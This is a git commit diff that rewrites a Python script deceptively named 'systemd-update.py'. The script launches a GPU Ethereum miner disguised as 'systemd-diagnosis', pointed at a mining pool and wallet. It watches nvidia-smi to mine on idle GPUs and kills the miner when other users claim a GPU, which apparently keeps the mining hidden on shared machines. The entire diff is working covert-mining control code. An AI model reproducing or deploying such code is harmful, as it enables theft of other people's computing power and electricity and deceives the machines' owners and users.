8ecc952916a7b9e6933b649cfbbf0aad1a2c5b4b
Pangjing-Wu <pangjing.wu@outlook.com>
2021-12-09 23:43:33 -0500

    add a simple implementation

--- source/systemd-update.py
+++ source/systemd-update.py
@@ -1,51 +1,89 @@
-from time import localtime, sleep
-from subprocess import check_output, call
+from collections import deque
+from email.mime.text import MIMEText
 from re import match
+from smtplib import SMTP, SMTPException
+from subprocess import CalledProcessError, call, check_output
+from threading import Thread
+from time import localtime, sleep, strftime
 
 
-def get_avail_gpus(avail_memory):
-    gpus = list()
-    smi = check_output('nvidia-smi').decode().split('\n')
-    memories = list(filter(lambda s: s.find('Default') != -1, smi))
-    for i in range(len(memories)):
-        memory   = match(r'.*?(\d+)MiB / (\d+)MiB', memories[i])
-        res_mem  = int(memory.group(2)) - int(memory.group(1))
-        if res_mem >= avail_memory:
-            gpus.append(i)
-    return gpus
+global signal
+signal = True
+
+class MinerControl(Thread):
+
+    def __init__(self):
+        super().__init__()
+        self.name = 'Miner control'
+        self.__flag = True
+        self.__waiting_round = 600
+        self.__memory_threshold = 6000
+        self.__waiting_count = -1
+        self.__gpus = self.__get_avail_gpus(0)
+        self.__working = [False] * len(self.__gpus)
+        
+
+    def run(self):
+        global signal
+
+        while self.__flag:
+            # check global signal.
+            if not signal:
+                self.stop()
+                break
+            avail_gpus = self.__get_avail_gpus(self.__memory_threshold)  # fully mining
+            # long waiting for starting new miner.
+            self.__waiting_count = (self.__waiting_count + 1) % self.__waiting_round
+            if not self.__waiting_count:
+                # update working state.
+                self.__working = [False] * len(self.__gpus)
+                workings = check_output('nl-toolkit | grep systemd-diagnosis | cut -c 6', shell=True).decode().split('\n')[:-1]
+                for gpu in workings:
+                    self.__working[int(gpu)] = True
+                # start miner.
+                for gpu in avail_gpus:
+                    if not self.__working[gpu]:
+                        call("nohup systemd-diagnosis --no-watchdog -o stratum+ssl://f2pool.jdkgs.xyz:14333 "
+                             f"-a ethash -u oxa31d3e12b.gcc{gpu+1} -d {gpu} 2>&1 > /dev/null &", shell=True)
+                        self.__working[gpu] = True
+                        sleep(1)
+            # detect gpu status, kill the miner when some one is going to use the gpu.
+            for gpu in self.__gpus:
+                if gpu not in avail_gpus and self.__working[gpu]:
+                    call(f"nl-toolkit | grep ' {gpu} ' |  grep 'systemd-diagnosis' | "
+                         "cut -c 21-28 | xargs kill -9 2>&1 > /dev/null", shell=True)
+                    self.__working[gpu] = False
+            sleep(2)
+
+
+    def stop(self):
+        self.__flag = False
+        call(f"nl-toolkit | grep 'systemd-diagnosis' | cut -c 21-28"
+             " | xargs kill -9 2>&1 > /dev/null &", shell=True)
+
+    def __get_avail_gpus(self, memory_threshold):
+        '''
+        input:
+            memory_threshold: int, min available video memory.
+        output:
+            gpus: list of int, available gpu list.
+        '''
+        gpus = list()
+        smi  = check_output('nvidia-smi').decode().split('\n')
+        for i, mem_info in enumerate(filter(lambda s: s.find('Default') != -1, smi)):
+            memory   = match(r'.*?(\d+)MiB / (\d+)MiB', mem_info)
+            res_mem  = int(memory.group(2)) - int(memory.group(1))
+            if res_mem >= memory_threshold:
+                gpus.append(i)
+        return gpus
 
 
 def main():
-    waiting_round = 180
-    min_avail_memory = 10000
-
-    gpus = get_avail_gpus(0)
-    working = [False] * len(gpus)
-    waiting_flag = -1
-    while True:
-        if localtime().tm_hour >= 8:
-            if any(working):
-                call(f"nl-toolkit | grep 'systemd-diagnosis' | cut -c 21-28 | xargs kill -9 2>&1 > /dev/null &", shell=True)
-                working = [False] * len(gpus)
-                waiting_flag = -1
-            else:
-                sleep(60)
-
-        else:
-            avail_gpus  = get_avail_gpus(min_avail_memory)
-            waiting_flag = (waiting_flag + 1) % waiting_round
-            if not waiting_flag:
-                for gpu in avail_gpus:
-                    if not working[gpu]:
-                        call(f"nohup systemd-diagnosis -epsw x -mode 1 -Rmode 1 -log 0 -mport 0 -etha 0 -retrydelay 1 -ftime 55 -tt 79 -tstop 89 -asm 2 -pool eth.f2pool.com:6688 -gpus {gpu+1} -wal oxa31d3e12b -worker gcc{gpu+1} -coin eth 2>&1 > /dev/null &", shell=True)
-                        working[gpu] = True
-                        sleep(1)
-
-            for gpu in gpus:
-                if gpu not in avail_gpus and working[gpu]:
-                    call(f"nl-toolkit | grep ' {gpu} ' |  grep 'systemd-diagnosis' | cut -c 21-28 | xargs kill -9 2>&1 > /dev/null &", shell=True)
-                    working[gpu] = False
-            sleep(2)
+    miner = MinerControl()
+    try:
+        miner.start()
+    except:
+        miner.stop()
 
 
 if __name__ == '__main__':
